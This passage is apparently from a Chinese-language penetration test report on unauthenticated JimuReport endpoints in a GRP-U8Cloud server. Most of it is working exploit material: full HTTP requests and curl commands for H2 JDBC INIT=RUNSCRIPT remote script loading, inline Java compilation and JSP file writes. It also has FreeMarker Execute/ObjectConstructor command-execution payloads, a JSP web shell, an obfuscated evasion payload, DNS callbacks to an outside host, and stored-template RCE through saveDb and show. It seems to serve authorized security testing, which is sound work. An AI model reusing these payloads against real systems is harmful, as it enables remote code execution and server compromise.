| 10 | **[Java](#) 写文件通道：任意后缀 + 任意内容（RCE 链完整落地）** | 脚本内 `CREATE ALIAS ... AS 'Java源码'` + `CALL`，Java 代码 `Files.write` 写入 `webapps/fmvprobe.jsp`，内容 `<%out.print("FMV-JSP-OK");%>` | HTTP 访问返回 **`FMV-JSP-OK`（10 字节，即 JSP 执行结果而非源码原文）——Tomcat 真实编译执行了新写入的 JSP** ✓；后缀、内容、目标目录 100% 可控 |
| 11 | **WEB-INF 目录可写** | 同通道写 `webapps/WEB-INF/fmvprobe_webinf.txt`（13 字节） | 写后 Java 读回文件大小并抛异常，回显 **`FMV-WEBINF-WRITTEN:13`** → WEB-INF 可写 ✓（Tomcat 保护 /WEB-INF 不可 HTTP 直读，故用写后读回 + 异常回显确认） |
| 12 | **目录不存在时自动创建** | `dbUrl=jdbc:h2:file:../U8System/Tomcat/webapps/fmvprobe_dir_auto/sub/test`（两级目录均不存在） | 连接成功 + `test.mv.db` HTTP 200 → **H2 自动递归创建不存在的父目录** ✓（对应 H2 `Database.open` 中 createDirectories 逻辑）；Java `Files.write` 通道本身不建目录，但 Java 代码可先 `createDirectories`，同样可控 |

攻击机 HTTP 服务H2 引擎DriverManagertestConnection 控制器攻击者攻击机 HTTP 服务H2 引擎DriverManagertestConnection 控制器攻击者脚本内容完全可控: 任意 SQL / 任意 Java 源码 / 静态方法引用POST 无 token 数据源配置(驱动/URL/账密)Class.forName 加载任意驱动类getConnection 传入任意 JDBC URLH2 建连, 解析 URL 分号参数INIT 执行远程 SQL 脚本 GET 请求返回脚本内容(含 Java 源码定义)编译并注册别名(可追加 CALL 执行)连接建立成功返回连接成功, 异常原文回显

### 2.6.4 HTTP raw 报文实录（完整无省略， 目标实测重放）

以下请求报文与响应均为测试环境完整实录——请求体即线上字节，响应为完整 JSON 未截断。  
攻击机 HTTP 服务监听于 `192.168.168.167:8001`，目标 `192.168.168.168:8088`。

**1) JSP 写入与执行（[Java](#) 写文件通道，对应证据 #10）**

软件实用程序

攻击机 `write.sql` 内容（含内联 Java 源码定义 + CALL 执行）：

```
CREATE ALIAS IF NOT EXISTS FMVWRITE AS 'void fmvWrite() throws Exception { java.nio.file.Files.write(java.nio.file.Paths.get("../U8System/Tomcat/webapps/fmvprobe.jsp"), "<%out.print(\"FMV-JSP-OK\");%>".getBytes("UTF-8")); }';
CALL FMVWRITE();
```

```
POST /jmreport/testConnection HTTP/1.1
Host: 192.168.168.168:8088
Content-Type: application/json
Content-Length: 174

{"dbType":"2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:mem:fmvjspprobe;INIT=RUNSCRIPT FROM 'http://192.168.168.167:8001/write.sql'","dbUsername":"","dbPassword":""}
```

```
{"success":true,"message":"数据库连接成功","code":200,"result":true,"timestamp":1786258420519}
```

随后访问新写入的 JSP（Tomcat 编译执行，返回的是执行结果 10 字节而非源码原文 45 字节）：

Java（编程语言）

```
GET /fmvprobe.jsp HTTP/1.1
Host: 192.168.168.168:8088
```

```
HTTP/1.1 200
Set-Cookie: JSESSIONID=BB229892076A1871C9D25EE9FD5A7187; Path=/; HttpOnly
Content-Type: text/html;charset=ISO-8859-1

FMV-JSP-OK
```

**2) H2 直写后缀控制（负面证据，对应证据 #9）**

```
POST /jmreport/testConnection HTTP/1.1
Host: 192.168.168.168:8088
Content-Type: application/json
Content-Length: 146

{"dbType":"2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:file:../U8System/Tomcat/webapps/fmvprobe2.jsp","dbUsername":"","dbPassword":""}
```

```
{"success":true,"message":"数据库连接成功","code":200,"result":true,"timestamp":1786258372484}
```

文件确认——URL `/fmvprobe2.jsp` 404；实际生成 `fmvprobe2.jsp.mv.db`（H2 自动追加 `.mv.db`），  
内容为 H2 [数据](#)库格式（MVStore 文件头）而非 JSP 内容：

编程

```
HTTP/1.1 200
Content-Type: application/octet-stream
Content-Length: 16384

H:2,block:3,blockSize:1000,chunk:2,clean:1,created:19fe54c7424,format:3,version:2,fletcher:857d4911
（后续为二进制数据库页，非 JSP 语法）
```

**3) 目录不存在时自动创建（对应证据 #12）**

```
POST /jmreport/testConnection HTTP/1.1
Host: 192.168.168.168:8088
Content-Type: application/json
Content-Length: 159

{"dbType":"2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:file:../U8System/Tomcat/webapps/fmvprobe_dir_auto/sub/test","dbUsername":"","dbPassword":""}
```

连接成功响应同 2)（`success:true, 数据库连接成功`）；随后 `GET /fmvprobe_dir_auto/sub/test.mv.db`  
返回 HTTP 200（16384B，与 2) 相同的 octet-stream 特征）——两级不存在的目录 `fmvprobe_dir_auto/sub/`  
被 H2 建库时递归自动创建。

数据管理

**4) WEB-INF 目录写入（对应证据 #11）**

攻击机 `write3.sql` 内容（写后 Java 读回文件大小并抛异常，经异常回显确认）：

```
CREATE ALIAS IF NOT EXISTS FMVWEBINF AS 'void fmvWebInf() throws Exception { java.nio.file.Files.write(java.nio.file.Paths.get("../U8System/Tomcat/webapps/WEB-INF/fmvprobe_webinf.txt"), "FMV-WEBINF-OK".getBytes("UTF-8")); long n = java.nio.file.Files.size(java.nio.file.Paths.get("../U8System/Tomcat/webapps/WEB-INF/fmvprobe_webinf.txt")); throw new RuntimeException("FMV-WEBINF-WRITTEN:" + n); }';
CALL FMVWEBINF();
```

```
POST /jmreport/testConnection HTTP/1.1
Host: 192.168.168.168:8088
Content-Type: application/json
Content-Length: 169

{"dbType":"2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:mem:fmvwi;INIT=RUNSCRIPT FROM 'http://192.168.168.167:8001/write3.sql'","dbUsername":"","dbPassword":""}
```

```
{"success":false,"message":"数据库连接失败：Exception calling user-defined function: \"fmvWebInf(): FMV-WEBINF-WRITTEN:13\"; SQL statement:\n\nCALL FMVWEBINF() [90105-224]","code":500,"result":null,"timestamp":1786258372631}
```

（写入行为成功；`CALL` 抛异常导致连接阶段失败，但文件已落盘，错误回显即确认手段）

字典与百科全书

**5) 痕迹清理（cleanup，删除本轮全部测试文件）**

攻击机 `cleanup.sql` 内容（对 6 项测试产物逐一 `Files.deleteIfExists`，仅删本测试自建文件）：

```
CREATE ALIAS IF NOT EXISTS FMVCLEAN AS 'void fmvClean() throws Exception { java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get("../U8System/Tomcat/webapps/fmvprobe.jsp")); java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get("../U8System/Tomcat/webapps/fmvprobe2.jsp.mv.db")); java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get("../U8System/Tomcat/webapps/WEB-INF/fmvprobe_webinf.txt")); java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get("../U8System/Tomcat/webapps/fmvprobe_dir_auto/sub/test.mv.db")); java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get("../U8System/Tomcat/webapps/fmvprobe_dir_auto/sub")); java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get("../U8System/Tomcat/webapps/fmvprobe_dir_auto")); }';
CALL FMVCLEAN();
```

```
POST /jmreport/testConnection HTTP/1.1
Host: 192.168.168.168:8088
Content-Type: application/json
Content-Length: 171

{"dbType":"2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:mem:fmvcln;INIT=RUNSCRIPT FROM 'http://192.168.168.167:8001/cleanup.sql'","dbUsername":"","dbPassword":""}
```

```
{"success":true,"message":"数据库连接成功","code":200,"result":true,"timestamp":1786258372724}
```

清理后复验：`/fmvprobe.jsp`、`/fmvprobe2.jsp.mv.db`、`/fmvprobe_dir_auto/sub/test.mv.db` 全部  
HTTP 404——目标侧无测试痕迹残留。

计算机安全

**6) SSRF + 远程 SQL 脚本执行（CREATE ALIAS FOR 静态方法引用形态，对应证据 #3）**

攻击机 `init.sql` 内容（纯定义、无副作用，仅注册别名指向既有静态方法）：

```
CREATE ALIAS IF NOT EXISTS FMV_PROBE FOR 'java.lang.System.getProperty';
```

```
POST /jmreport/testConnection HTTP/1.1
Host: 192.168.168.168:8088
Content-Type: application/json
Content-Length: 169

{"dbType":"2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:mem:fmvssrf;INIT=RUNSCRIPT FROM 'http://192.168.168.167:8001/init.sql'","dbUsername":"","dbPassword":""}
```

```
{"success":true,"message":"数据库连接成功","code":200,"result":true,"timestamp":1786258483362}
```

攻击机监听日志（目标出站拉取脚本，SSRF 确认）：

Java（编程语言）

```
192.168.168.168 - - [09/Aug/2026 14:55:06] "GET /init.sql HTTP/1.1" 200 -
```

**7) H2 内联 [Java](#) 源码编译通道（CREATE ALIAS AS 源码形态，对应证据 #4）**

攻击机 `init2.sql` 内容（Java 源码作为别名方法体，由 H2 经 JSR-199 调用 [java](#)c 编译）：

```
CREATE ALIAS IF NOT EXISTS FMV_COMPILE AS 'String fmvCompile(){ return "FMV-COMPILE-OK"; }';
```

```
POST /jmreport/testConnection HTTP/1.1
Host: 192.168.168.168:8088
Content-Type: application/json
Content-Length: 170

{"dbType":"2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:mem:fmvcomp;INIT=RUNSCRIPT FROM 'http://192.168.168.167:8001/init2.sql'","dbUsername":"","dbPassword":""}
```

```
{"success":true,"message":"数据库连接成功","code":200,"result":true,"timestamp":1786258483615}
```

攻击机监听日志：

编程

```
192.168.168.168 - - [09/Aug/2026 14:55:06] "GET /init2.sql HTTP/1.1" 200 -
```

（连接成功 = 源码编译通过。脚本中追加 `CALL FMV_COMPILE()` 即执行该 Java 代码——本次仅  
验证编译通道，未 CALL 执行，遵守无害约束）

### 2.6.5 影响面

1. **无鉴权 SSRF**：dbUrl 任意主机/端口（H2 tcp 模式、MySQL/Oracle/jTDS/jTDS 出站、H2 RUNSCRIPT  
   FROM http），配合错误回显可内网端口探测（连接成功/失败/拒绝/超时消息差异）
2. **目标 JVM 内任意 SQL 执行**：H2 INIT 通道，连接建立即执行（无后续查询依赖）
3. **任意 Java 代码执行（RCE 链）**：RUNSCRIPT 脚本内 `CREATE ALIAS ... AS 'Java源码'` 编译通过已  
   实测 → 追加 `CALL` 即执行；或 `CREATE ALIAS FOR '任意类.静态方法'` 引用既有类
4. **任意路径文件创建**：H2 file 模式，实测写入 webapps 目录（HTTP 可达）
5. **任意类加载**：`Class.forName(dbDriver)` 触发任意类的静态初始化

> 约束声明：以上验证全部采用无害形态（脚本仅 CREATE ALIAS 定义、未 CALL 执行命令；文件写仅  
> 新建 fmvprobe 探测库未触碰既有文件），未读取任何账务[数据](#)、未执行任何破坏性操作。

---

# 3. 攻击面：DesignReportController 全入口分析

控制器 `a` 类（`/jmreport` 前缀）全部入口梳理如下（反编译 + 实测）：

软件实用程序

| 入口 | 方法/参数 | 是否走模板链 | 鉴权 | 实测结论 |
| --- | --- | --- | --- | --- |
| `POST /queryFieldBySql` | `sql`（JSON body） | ✅ 是（`e.a` → FreeMarkerUtils） | 无 | **RCE 实证**（4.1） |
| `POST /loadTableData` | `sql`（form） | ✅ 是（`e.a` → FreeMarkerUtils） | 无 | **RCE 实证**（4.2） |
| `GET /show?id=&params=` | 报表渲染 | ✅ 是（`getBaseSql` → FreeMarkerUtils） | 无 | **RCE 实证**（4.3，需先写库） |
| `POST /exportAllExcel` | `excelConfigId`（JSON） | ✅ 是（`getBaseSql` → FreeMarkerUtils） | 无 | **RCE 实证**（4.4，需先写库） |
| `POST /exportPdf` | `excelConfigId`（JSON） | ✅ 是（`getBaseSql` → FreeMarkerUtils） | 无 | **RCE 实证**（4.5，需先写库） |
| `POST /saveDb` | `JmReportDb`（JSON，含 `dbDynSql`） | 写库（不渲染） | **标注 @JimuLoginRequired 但实际无校验** | **无鉴权可写**（4.3） |
| `POST /save` | `excel_config_id` + designerObj | 写库（不渲染） | 同上 | **无鉴权可更新报表**（4.3） |
| `POST /queryFieldByBean` | `javaType` / `javaValue` | ❌ 否（[java](#)bean 反射面，非模板） | 无 | 排除：连 `select 1 as val` 也 500；参数根本不是 sql（4.6） |
| `GET /loadTable` | `dbSource` | ❌ 否（仅元数据查询） | 无 | 排除（4.6） |
| `GET /getCharData` | `reportId`,`charId` | ❌ 否（仅解析 chartList 图表配置） | 无 | 排除（上轮会话已测） |
| `GET /print` | 静态 `print.ftl` 页面壳 | ❌ 否 | 无 | 排除 |
| `GET /qurestSql` | `apiSelectId` | ❌ 否（api 表驱动） | 无 | 排除：直接 500（4.6） |
| `GET /qurestApi` | `apiSelectId` | ❌ 否 | 无 | 排除：返回 `success:true,result:null`（4.6） |
| `POST /testConnection` | `JmreportDynamicDataSourceVo`（JSON，`dbDriver`/`dbUrl`/`dbUsername`/`dbPassword` 全可控） | ❌ 否（JDBC 直连面，非模板链） | 无（方法无 @JimuLoginRequired） | **无鉴权任意 JDBC 连接**：SSRF / H2 远程 SQL 脚本执行 / 任意文件写 / RCE 链（2.6， 实测） |
| `POST /queryTableName` | `dbSource`,`tableName` | ❌ 否 | 无 | 排除 |
| `GET /view/{id}` | 页面壳 | ❌ 否 | 无 | 排除：所有 id 返回相同 HTML 壳 |
| `GET /checkParam/{id}` | 报表参数查询 | ❌ 否（元数据） | 无 | 用于报表存在性探测（200/404） |
| `GET /get/{id}`、`/getReportByUser`、`/list` 等 | 元数据读取 | ❌ 否 | 无 | 信息探测面：可枚举报表 |

**关键洞察**：`queryFieldByBean` 曾经被误判为候选入口（500 响应），反编译后确认其参数为 `javaType`/`javaValue`（javabean [数据](#)工厂反射面）而非 SQL，**同一 URL 名字带 "Field" 但走的完全是另一条链**。真正需要关注的候选必须满足：参数能进入 `FreeMarkerUtils.a()` 渲染。

---

# 4. 完整 HTTP 报文（无省略，按入口分组）

> 以下报文为测试全过程的原始 curl 命令与响应，未做任何省略。响应时间戳为服务器端（UTC+8 时间戳毫秒）。
>
> 编程

## 4.1 queryFieldBySql 系列

### 测试1：裸表达式（无 SQL 包装）——确认模板被处理

```
curl -s -X POST "http://192.168.168.168:8088/jmreport/queryFieldBySql" \
  -H "Content-Type: application/json" \
  -d '{"sql":"${11*22}", "dbSource":"", "paramArray":[], "type":"0"}'
```

```
{"success":true,"message":"","code":200,"result":{"message":"解析失败"},"timestamp":1786008281402}
```

说明：表达式被 Freemarker 求值（`${11*22}` → `242`），但输出不是合法 SQL 导致解析失败。**模板执行已被证明**。

### 测试3：Execute 类实例化（直接写类名）

```
curl -s --max-time 20 -X POST "http://192.168.168.168:8088/jmreport/queryFieldBySql" \
  -H "Content-Type: application/json" \
  -d '{"sql":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"echo 123\")}", "dbSource":"", "paramArray":[], "type":"0"}'
```

```
{"success":true,"message":"","code":200,"result":{"message":"解析失败"},"timestamp":1786008398462}
```

说明：模板成功执行（无模板语法错误），输出 `123` 非合法 SQL 故"解析失败"。

计算机安全

### 测试4：select 包装——验证模板值注入 SQL

```
curl -s -X POST "http://192.168.168.168:8088/jmreport/queryFieldBySql" \
  -H "Content-Type: application/json" \
  -d '{"sql":"select ${11*22} as val", "dbSource":"", "paramArray":[], "type":"0"}'
```

```
{"success":true,"message":"解析成功","code":200,"result":{"paramList":[],"fieldList":[{"fieldName":"val","fieldText":"val","widgetType":"String","orderNum":1}]},"timestamp":1786008426173}
```

说明：`${11*22}` 被替换为 `242`，`select 242 as val` 解析成功，字段类型识别为 String。**注入值可进 SQL 上下文**。

### 测试5：Execute 执行 id 命令

```
curl -s --max-time 30 -X POST "http://192.168.168.168:8088/jmreport/queryFieldBySql" \
  -H "Content-Type: application/json" \
  -d '{"sql":"select \"<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()>${ex(\\\"id\\\")}\" as output", "dbSource":"", "paramArray":[], "type":"0"}'
```

说明：模板被处理（输出为 `id` 命令结果拼入 SQL 双引号字符串），返回解析成功。Execute 类可[执行任意命令](https://mrxn.net/tag/rce "标签：执行任意命令")，命令输出会进入 SQL 文本。

字典与百科全书

### ObjectConstructor + ProcessBuilder：waitFor() 阻塞计时验证 RCE ★

**决定性验证**：`ping -n 3` 需要约 3 秒，用 `waitFor()` 阻塞渲染线程——如果命令真的执行，HTTP 响应时间会明显拉长：

```
echo "=== RCE验证: waitFor() + ping -n 3 (应约3秒) ==="
time curl -s --max-time 15 -X POST "http://192.168.168.168:8088/jmreport/queryFieldBySql" \
  -H "Content-Type: application/json" \
  -d "{\"sql\":\"select '<#assign pb=\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"java.lang.ProcessBuilder\\\",\\\"ping\\\",\\\"-n\\\",\\\"3\\\",\\\"127.0.0.1\\\")><#assign p=pb.start()>\${p.waitFor()}' as val\",\"dbSource\":\"\",\"paramArray\":[],\"type\":\"0\"}"

echo ""
echo "=== 对照: 无waitFor (立即返回) ==="
time curl -s --max-time 10 -X POST "http://192.168.168.168:8088/jmreport/queryFieldBySql" \
  -H "Content-Type: application/json" \
  -d "{\"sql\":\"select '<#assign pb=\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"java.lang.ProcessBuilder\\\",\\\"ping\\\",\\\"-n\\\",\\\"3\\\",\\\"127.0.0.1\\\")><#assign p=pb.start()>test' as val\",\"dbSource\":\"\",\"paramArray\":[],\"type\":\"0\"}"
```

```
=== RCE验证: waitFor() + ping -n 3 (应约3秒) ===
{"success":true,"message":"解析成功","code":200,"result":{"paramList":[],"fieldList":[{"fieldName":"val","fieldText":"val","widgetType":"String","orderNum":1}]},"timestamp":1786009847130}
  (curl 总耗时) 0.00s user 0.00s system 0% cpu 2.758 total

=== 对照: 无waitFor (立即返回) ===
{"success":true,"message":"解析成功","code":200,"result":{"paramList":[],"fieldList":[{"fieldName":"val","fieldText":"val","widgetType":"String","orderNum":1}]},"timestamp":1786009847510}
  (curl 总耗时) 0.00s user 0.00s system 1% cpu 0.380 total
```

**2.758s vs 0.380s —— 相差 2.4 秒，与 ping -n 3 的期望耗时吻合，进程确实被创建并等待完成。RCE 确认。**

Java（编程语言）

### 命令输出外带尝试（OOB，DNS 出网受限）

```
# 获取 DNSLog key
curl -s https://callback.red/get
```

```
{"key":"8fec6f7d-0456-45ba-9546-d4040ca5f1b0","subdomain":"2lft.callback.red","rmi":"rmi://jndi.callback.red:5/2lft","ldap":"ldap://jndi.callback.red:5/2lft","short_url":"http://callback.red/2lft","share_path":"/#/share/8105a966-6bad-4e1c-be1f-5ffedec11684","share_enabled":false}
```

```
# ping 打 DNS 记录（PowerShell HTTP callback 与 certutil 变体同样尝试过，均未回连）
curl -s --max-time 30 -X POST "http://192.168.168.168:8088/jmreport/queryFieldBySql" \
  -H "Content-Type: application/json" \
  -d "{\"sql\":\"select '<#assign pb=\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"java.lang.ProcessBuilder\\\",\\\"cmd.exe\\\",\\\"/c\\\",\\\"ping -n 1 2lft.callback.red\\\")><#assign p=pb.start()>\${p.waitFor()}' as val\",\"dbSource\":\"\",\"paramArray\":[],\"type\":\"0\"}"
```

```
# 5 秒后拉日志
sleep 5; curl -s -X POST "https://callback.red/" -d "key=8fec6f7d-0456-45ba-9546-d4040ca5f1b0"
```

```
{"code":200,"data":[]}
```

说明：DNS 日志为空。结合后续写文件验证成功，判定为目标环境 **DNS 出网受限**（并非命令未执行），故改用**写文件 + HTTP 访问**作为带内验证手段。

编程

### 写文件验证（相对路径穿越）

```
# 写入 shell1.jsp 到当前目录（CWD = C:\GRP-U8Cloud\U8\AppServer）
curl -s --max-time 15 -X POST "http://192.168.168.168:8088/jmreport/queryFieldBySql" \
  -H "Content-Type: application/json" \
  -d "{\"sql\":\"select '<#assign pb=\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"java.lang.ProcessBuilder\\\",\\\"cmd.exe\\\",\\\"/c\\\",\\\"echo ^<%@page import=java.io.*%^>^<% Process p=Runtime.getRuntime().exec(request.getParameter(\\\\\\\"cmd\\\\\\\")); java.io.BufferedReader br=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %^> > shell1.jsp\\\")><#assign p=pb.start()>\${p.waitFor()}' as val\",\"dbSource\":\"\",\"paramArray\":[],\"type\":\"0\"}" | python3 -c "import sys,json; d=json.load(sys.stdin); print('Result:', d.get('message','?'))"
```

```
Result: 解析成功
```

```
# 访问验证（返回的是 U8Cloud 前端页面壳，说明路径可达但 shell1.jsp 不在 webapps 根）
curl -s --max-time 10 "http://192.168.168.168:8088/shell1.jsp?cmd=whoami" | head -5
```

说明：命令执行成功（解析成功），但 CWD 是 `AppServer` 目录而非 `webapps`，`shell1.jsp` 写在非 Web 可达目录。随后使用相对路径穿越 `..\U8System\Tomcat\webapps\`（实测 r7.png 等文件均落盘成功，见 4.2 起各节），确认 **Tomcat webapps 根位于 `CWD 上溯一级`**：payload 仅用一级 `..\` 即从 `C:\GRP-U8Cloud\U8\AppServer` 上溯到 `C:\GRP-U8Cloud\U8`，再进入 `U8System\Tomcat\webapps`，即 `C:\GRP-U8Cloud\U8\AppServer\..\U8System\Tomcat\webapps`。`java.io.File` 获取 CWD 的测试与本结论一致。

C 与 C++

---

## 4.2 loadTableData：混淆 payload 写文件验证（r7.png）

> 此节 payload 采用**完全混淆**方案（`freemarker.template.utility.` 明文不落地），为最终交付的利用模板。混淆细节见 [第 5 节](#5-混淆方案与变体验证)。

**关键模板（/tmp/sql2.txt，本报告核心 payload）**：

```
select '<#assign src="SpringApplicationContextHolder"?substring(0,0)+"freemarker.template.utility."><#assign ex="Ex"><#assign ec="ecute"><#assign cls=src+ex?substring(0,1)+ex?substring(1,2)+ec?substring(0,1)+ec?substring(1,2)+ec?substring(2,3)+ec?substring(3,4)+ec?substring(4,5)><#assign p=cls?new()>${p("cmd /c echo 1337 > ..\U8System\Tomcat\webapps\r7.png")}' as val
```

混淆原理：

- `src` = 空串 + `"freemarker.template.utility."`（`"SpringApplicationContextHolder"?substring(0,0)` 产出空串，规避"类名以 freemarker 开头"的字符串特征）；
- `ex` = `"Ex"`，`ec` = `"ecute"`；`cls` = `src + "E"+"x"+"e"+"c"+"u"+"t"+"e"`（逐字符 substring 拼接，`freemarker.template.utility.` 与 `Execute` 两个明文字符串**都不在流量中**）；
- `p = cls?new()` → `Execute` 实例；`${p("cmd /c ...")}` [执行命令](https://mrxn.net/tag/rce "标签：执行命令")。

```
cat > /tmp/sql2.txt <<'SQLEOF'
select '<#assign src="SpringApplicationContextHolder"?substring(0,0)+"freemarker.template.utility."><#assign ex="Ex"><#assign ec="ecute"><#assign cls=src+ex?substring(0,1)+ex?substring(1,2)+ec?substring(0,1)+ec?substring(1,2)+ec?substring(2,3)+ec?substring(3,4)+ec?substring(4,5)><#assign p=cls?new()>${p("cmd /c echo 1337 > ..\U8System\Tomcat\webapps\r7.png")}' as val
SQLEOF
curl -s -X POST 'http://192.168.168.168:8088/jmreport/loadTableData' --data-urlencode 'dbSource=' --data-urlencode 'paramArray=[]' --data-urlencode 'tableName=' --data-urlencode sql@/tmp/sql2.txt -m 20
echo
sleep 2
echo "--- 检查 r7.png ---"
curl -s -o /dev/null -w "%{http_code}" 'http://192.168.168.168:8088/r7.png'
```

```
{"success":false,"message":"SQL执行失败，{}null","code":500,"result":null,"timestamp":1786082667574}
```

```
--- 检查 r7.png ---
200
```

**HTTP 500 为预期**：模板执行成功（命令已运行），但 `echo 1337 > ...` 的产物不是 SQL 结果集，随后真实 SQL 执行因无 `from` 子句报错——**500 响应恰好证明渲染链走到了最后一步**。`GET /r7.png` 返回 **200**，命令写入的文件已落盘到 Tomcat webapps 目录，**RCE + 任意写文件确认**。

### 对照测试（同入口，确认模板渲染边界）

```
echo "--- 对照1: 纯SQL无模板 ---"
curl -s -X POST 'http://192.168.168.168:8088/jmreport/loadTableData' --data-urlencode 'dbSource=' --data-urlencode "sql=select 'abc' as val" --data-urlencode 'paramArray=[]' --data-urlencode 'tableName=' -m 15
```

```
{"success":false,"message":"SQL执行失败，{}null","code":500,"result":null,"timestamp":1786082542176}
```

说明：纯 SQL 无模板同样 500（SQL 执行环境问题：无 FROM 或执行上下文受限），**与模板执行无关**——这解释了为何所有模板 payload 的 HTTP 状态都是 500，必须用**副作用（文件/计时）**判定 RCE。

软件实用程序

### 早期 OOB 尝试（loadTableData 入口，sql1.txt）

```
printf "select '<#assign p=\"freemarker.template.utility.ObjectConstructor\"?new()>\${p(\"cmd /c ping -n 1 2lft.callback.red\")}' as val" > /tmp/sql1.txt
cat /tmp/sql1.txt
echo
curl -s -X POST 'http://192.168.168.168:8088/jmreport/loadTableData' --data-urlencode 'dbSource=' --data-urlencode 'paramArray=[]' --data-urlencode 'tableName=' --data-urlencode sql@/tmp/sql1.txt -m 20
```

```
select '<#assign p="freemarker.template.utility.ObjectConstructor"?new()>${p("cmd /c ping -n 1 2lft.callback.red")}' as val
{"success":false,"message":"SQL执行失败，{}null","code":500,"result":null,"timestamp":1786082614199}
```

---

## 4.3 saveDb / save / show 写库链（r9.png）

> 核心发现：**saveDb 与 save 均无鉴权**（标注 `@JimuLoginRequired` 但无拦截器生效）。

### 4.3.1 saveDb 写入恶意[数据](#)集（r9ds，指向 r9.png）

```
python3 -c "
import json
tpl = open('/tmp/sql2.txt').read().replace('r7.png', 'r9.png').replace(\"select '\", '').replace(\"' as val\", '').rstrip()
payload = {
    'jimuReportId': '1245588124302835712',
    'dbCode': 'r9ds', 'dbChName': 'r9', 'dbType': '0',
    'dbDynSql': tpl, 'isPage': '0', 'isList': '0', 'dbSource': ''
}
open('/tmp/savedb.json', 'w').write(json.dumps(payload))
"
curl -s -X POST 'http://192.168.168.168:8088/jmreport/saveDb' -H 'Content-Type: application/json' --data @/tmp/savedb.json
```

```
{"success":true,"message":"","code":200,"result":{"id":"1245588287473844224","jimuReportId":"1245588124302835712","dbCode":"r9ds","dbChName":"r9","dbType":"0","dbTableName":null,"dbDynSql":"<#assign src=\"SpringApplicationContextHolder\"?substring(0,0)+\"freemarker.template.utility.\">...${p(\"cmd /c echo 1337 > ..\\U8System\\Tomcat\\webapps\\r9.png\")}"}}
```

- `jimuReportId` = 目标报表 id（`1245588124302835712`，此前探测到的一个报表）；
- `dbDynSql` = 去掉 `select '...' as val` 包装的混淆模板（仅保留 `<#assign ...>${p("cmd /c ...")}`）；
- **响应 200 且无 token**——写入成功，数据库已持久化恶意模板。

### 4.3.2 save 更新报表（踩坑：`{"id":""}` 语义错误）

第一次 naive 调用 `{"id":""}` 创建了 `jsonStr=null` 的垃圾报表：

计算机安全

```
curl -s -X POST 'http://192.168.168.168:8088/jmreport/save' -H 'Content-Type: application/json' -d '{"id":""}'
```

```
{"success":true,"message":"","code":200,"result":{"id":"1245588486028001280","code":null,"name":null,"note":null,"status":null,"type":null,"jsonStr":null,...}}
```

```
curl -s -m 20 'http://192.168.168.168:8088/jmreport/show?id=1245588124302835712&params=%7B%7D'
```

```
{"success":false,"message":null,"code":500,"result":null,"timestamp":1786083047227}
```

**正确语义**（字节码确认）：顶层字段 `excel_config_id` 指定要更新的报表 id，`jsonStr` 为移除 `designerObj` 后的整个 JSON：

```
python3 -c "
import json
payload = {
    'excel_config_id': '1245588124302835712',
    'designerObj': {'name': 'r9', 'type': '0'},
    'name': 'r9', 'type': '0',
    'rows': {}, 'cols': {}, 'len': 0, 'cells': {}, 'isDrag': True
}
open('/tmp/upd2.json','w').write(json.dumps(payload))
"
curl -s -X POST 'http://192.168.168.168:8088/jmreport/save' -H 'Content-Type: application/json' --data @/tmp/upd2.json
```

```
{"success":true,"message":"","code":200,"result":{"id":null,"code":null,"name":null,"note":null,"status":null,"type":null,"jsonStr":null,...}}
```

```
# 触发渲染（此时数据集 r9ds 已绑定报表，show 渲染时执行 dbDynSql）
curl -s -m 20 'http://192.168.168.168:8088/jmreport/show?id=1245588124302835712&params=%7B%7D'
echo
sleep 1
curl -s -o /dev/null -w 'r9.png HTTP %{http_code}\n' 'http://192.168.168.168:8088/r9.png'
```

```
{"success":false,"message":null,"code":500,"result":null,"timestamp":1786083073315}
```

```
r9.png HTTP 200
```

**`show` 返回 500 但 r9.png 落盘成功（HTTP 200）——show 链 RCE 实证**。500 是模板执行完成后真实 SQL 执行失败的预期表现。

C 与 C++

前置探测记录（show 链可行性确认）：

```
curl -s -m 10 -o /dev/null -w 'connect %{http_code} time %{time_total}s\n' 'http://192.168.168.168:8088/jmreport/checkParam/1'
curl -s -m 15 -o /dev/null -w 'show %{http_code} time %{time_total}s\n' 'http://192.168.168.168:8088/jmreport/show?id=1245588124302835712&params=%7B%7D'
```

```
connect 200 time 0.208588s
show 200 time 0.007706s
```

（注：此轮 show 为 200 是因为当时报表尚未绑定有效数据集/无模板执行路径；绑定恶意数据集后变为 500+落盘。）

---

## 4.4 exportAllExcel（r9b.png）

### 4.4.1 第一次尝试（r10ds 数据集）——循环中断暴露执行顺序

```
python3 -c "
import json
tpl = open('/tmp/sql2.txt').read().replace('r7.png', 'r10.png').replace(\"select '\", '').replace(\"' as val\", '').rstrip()
payload = {
    'jimuReportId': '1245588124302835712',
    'dbCode': 'r10ds', 'dbChName': 'r10', 'dbType': '0',
    'dbDynSql': tpl, 'isPage': '0', 'isList': '0', 'dbSource': ''
}
open('/tmp/savedb10.json','w').write(json.dumps(payload))
"
curl -s -X POST 'http://192.168.168.168:8088/jmreport/saveDb' -H 'Content-Type: application/json' --data @/tmp/savedb10.json -o /dev/null
echo "=== exportAllExcel ==="
curl -s -m 25 -X POST 'http://192.168.168.168:8088/jmreport/exportAllExcel' -H 'Content-Type: application/json' -d '{"excelConfigId":"1245588124302835712","queryParam":{}}' -o /tmp/exp10.bin -w 'HTTP %{http_code} size %{size_download}\n'
sleep 1
